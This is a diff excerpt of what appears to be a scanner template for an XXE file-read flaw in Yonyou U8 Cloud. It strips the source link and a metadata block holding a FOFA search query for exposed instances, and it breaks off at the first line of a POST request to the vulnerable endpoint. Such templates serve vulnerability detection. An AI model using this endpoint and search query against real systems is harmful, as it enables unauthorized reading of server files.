@@ -3,12 +3,8 @@ info:
   name: 用友U8 Cloud smartweb2.showRPCLoadingTip.d XXE读取文件漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bwomx4te6196tgdx'
+  description: ''
   tags: xxe,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bwomx4te6196tgdx
-    fofa: app="用友-U8-Cloud"
 http:
 - raw:
   - 'POST /hrss/dorado/smartweb2.showRPCLoadingTip.d?skin=default&__rpc=true&windows=1 HTTP/1.1
